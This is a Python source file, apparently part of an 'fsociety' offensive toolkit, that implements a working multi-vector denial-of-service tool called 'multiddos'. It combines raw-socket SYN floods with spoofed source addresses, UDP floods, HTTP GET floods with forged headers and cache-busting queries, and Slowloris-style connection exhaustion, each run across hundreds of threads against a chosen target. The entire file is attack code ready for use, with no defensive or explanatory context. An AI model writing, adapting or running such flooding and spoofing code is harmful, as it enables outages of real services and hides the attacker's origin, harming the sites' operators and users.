from __future__ import annotations
import http.client
import os
import random
import socket
import ssl
import struct
import threading
import time
import urllib.parse
from fsociety.core.base import tool
from fsociety.core.logger import Log

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
]

@tool("multiddos", "Combined L3/L4/L7 volumetric and application-layer flood", category="dos")
class MultiDDoS:
    @staticmethod
    def build_parser(p):
        p.add_argument("target", help="Target IP or domain")
        p.add_argument("--port", type=int, default=80, help="Target port")
        p.add_argument("--threads", type=int, default=200, help="Threads per vector")
        p.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
        p.add_argument("--size", type=int, default=1400, help="UDP payload size")
        p.add_argument("--insecure", action="store_true", help="Ignore TLS verification")

    @staticmethod
    def _resolve(target: str) -> tuple[str, bool, str]:
        if "://" in target:
            parsed = urllib.parse.urlparse(target)
            host = parsed.hostname or target
            use_ssl = parsed.scheme == "https"
            path = parsed.path or "/"
            return host, use_ssl, path
        try:
            return socket.gethostbyname(target), False, "/"
        except socket.gaierror:
            return target, False, "/"

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2: data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _build_syn(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 0xffffffff)
        tcp = struct.pack("!HHLLBBHHH", sport, dst_port, seq, 0, 5 << 4, 0x02, 8192, 0, 0)
        pseudo = socket.inet_aton(src_ip) + socket.inet_aton(dst_ip) + struct.pack("!BBH", 0, 6, len(tcp))
        chk = MultiDDoS._checksum(pseudo + tcp)
        tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 40, random.randint(0, 65535), 0, 64, 6, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        ip_chk = MultiDDoS._checksum(ip)
        ip = ip[:10] + struct.pack("!H", ip_chk) + ip[12:]
        return ip + tcp

    @staticmethod
    def _syn_worker(target: str, port: int, stop_event: threading.Event):
        try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError: return
        while not stop_event.is_set():
            try:
                src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                s.sendto(MultiDDoS._build_syn(src, target, port), (target, 0))
            except Exception: pass
        s.close()

    @staticmethod
    def _udp_worker(target: str, port: int, size: int, stop_event: threading.Event):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(size)
        while not stop_event.is_set():
            try: s.sendto(payload, (target, port))
            except Exception: pass
        s.close()

    @staticmethod
    def _http_worker(host: str, port: int, path: str, use_ssl: bool, insecure: bool, stop_event: threading.Event):
        ctx = None
        if use_ssl:
            ctx = ssl.create_default_context()
            if insecure: ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        while not stop_event.is_set():
            try:
                conn = (http.client.HTTPSConnection(host, port, timeout=4, context=ctx) if use_ssl else http.client.HTTPConnection(host, port, timeout=4))
                req_path = f"{path}?{os.urandom(4).hex()}={os.urandom(8).hex()}"
                headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*", "Cache-Control": "no-cache", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
                conn.request("GET", req_path, headers=headers)
                conn.getresponse().read(64)
                conn.close()
            except Exception: pass

    @staticmethod
    def _slow_worker(host: str, port: int, path: str, use_ssl: bool, stop_event: threading.Event):
        ctx = None
        if use_ssl:
            ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        sockets = []
        while not stop_event.is_set():
            while len(sockets) < 50 and not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4); s.connect((host, port))
                    if use_ssl: s = ctx.wrap_socket(s, server_hostname=host)
                    s.send(f"GET {path}?{os.urandom(4).hex()} HTTP/1.1\r\nHost: {host}\r\n".encode())
                    sockets.append(s)
                except Exception: pass
            for s in list(sockets):
                try: s.send(f"X-{os.urandom(4).hex()}: {os.urandom(8).hex()}\r\n".encode())
                except Exception:
                    sockets.remove(s)
                    try: s.close()
                    except: pass
            time.sleep(5)
        for s in sockets:
            try: s.close()
            except: pass

    @staticmethod
    def run(args, log: Log) -> int:
        target_host, use_ssl, path = MultiDDoS._resolve(args.target)
        port = args.port if args.port else (443 if use_ssl else 80)

        log.info(f"Target: {target_host}:{port} (TLS: {use_ssl}) | Vectors: SYN, UDP, HTTP, SLOWLORIS")
        stop_event = threading.Event()
        threads = []

        def spawn(fn, *fn_args):
            for _ in range(args.threads):
                t = threading.Thread(target=fn, args=fn_args, daemon=True)
                t.start(); threads.append(t)

        if os.geteuid() == 0:
            spawn(MultiDDoS._syn_worker, target_host, port, stop_event)
            log.ok("SYN flood threads spawned (root)")
        else:
            log.warn("Skipping SYN flood (requires root)")

        spawn(MultiDDoS._udp_worker, target_host, port, args.size, stop_event)
        spawn(MultiDDoS._http_worker, target_host, port, path, use_ssl, args.insecure, stop_event)
        if args.threads >= 20:
            spawn(MultiDDoS._slow_worker, target_host, port, path, use_ssl, stop_event)

        start = time.time()
        try:
            while time.time() - start < args.duration: time.sleep(1)
        except KeyboardInterrupt: log.warn("Interrupted")

        stop_event.set()
        for t in threads: t.join(timeout=1.0)
        log.ok("Multi-vector attack finished.")
        return 0
